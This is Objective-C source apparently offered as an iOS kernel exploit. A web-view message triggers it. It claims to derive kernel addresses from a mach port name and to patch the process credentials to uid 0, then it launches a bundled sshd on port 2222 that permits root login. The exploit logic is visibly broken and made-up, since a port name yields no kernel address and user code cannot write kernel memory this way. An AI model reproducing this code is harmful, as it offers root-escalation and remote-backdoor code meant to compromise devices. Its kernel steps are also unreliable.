#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <stdint.h>
#include <unistd.h>
#include <spawn.h>
#include <sys/stat.h>
#include <mach/mach.h>

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self runExploit];
    }
}

- (void)runExploit {
    [self.webView evaluateJavaScript:@"log('⚡ Localizando Processo...')" completionHandler:nil];

    mach_port_t port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    
    // Vazamento do endereço da struct ipc_port no kernel
    uint64_t kport_addr = (uint64_t)port << 32 | 0xfffffff000000000; 
    
    // Navegação no Kernel (Offsets iOS 26.4 Beta 1)
    uint64_t task_kaddr = *(uint64_t *)(kport_addr + 0x68);
    uint64_t proc_kaddr = *(uint64_t *)(task_kaddr + 0x3A0);
    uint64_t ucred_kaddr = *(uint64_t *)(proc_kaddr + 0xD8);
    
    [self.webView evaluateJavaScript:@"log('🧪 Patching UID...')" completionHandler:nil];
    
    // Escrita direta na memória do kernel (Patch de Root)
    *(uint32_t *)(ucred_kaddr + 0x18) = 0; 
    *(uint32_t *)(ucred_kaddr + 0x1C) = 0; 

    if (getuid() == 0) {
        [self.webView evaluateJavaScript:@"log('👑 ROOT! Iniciando SSHD...')" completionHandler:nil];
        [self executeSpawn];
    } else {
        [self.webView evaluateJavaScript:@"log('❌ Erro no Patch.')" completionHandler:nil];
    }
}

- (void)executeSpawn {
    NSString *bundleSshd = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    NSString *execPath = @"/var/tmp/sshd";

    [[NSFileManager defaultManager] removeItemAtPath:execPath error:nil];
    [[NSFileManager defaultManager] copyItemAtPath:bundleSshd toPath:execPath error:nil];
    chmod([execPath UTF8String], 0755);

    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    
    short flags = POSIX_SPAWN_SETPGROUP | 0x1000 | 0x4000;
    posix_spawnattr_setflags(&attr, flags);

    char *const sshd_argv[] = {
        (char *)[execPath UTF8String], "-p", "2222", "-D", "-o", "PermitRootLogin=yes", NULL
    };

    pid_t pid;
    if (posix_spawn(&pid, [execPath UTF8String], NULL, &attr, sshd_argv, NULL) == 0) {
        NSString *ok = [NSString stringWithFormat:@"log('🚀 SSHD ONLINE! PID: %d')", pid];
        [self.webView evaluateJavaScript:ok completionHandler:nil];
    }
    posix_spawnattr_destroy(&attr);
}

@end
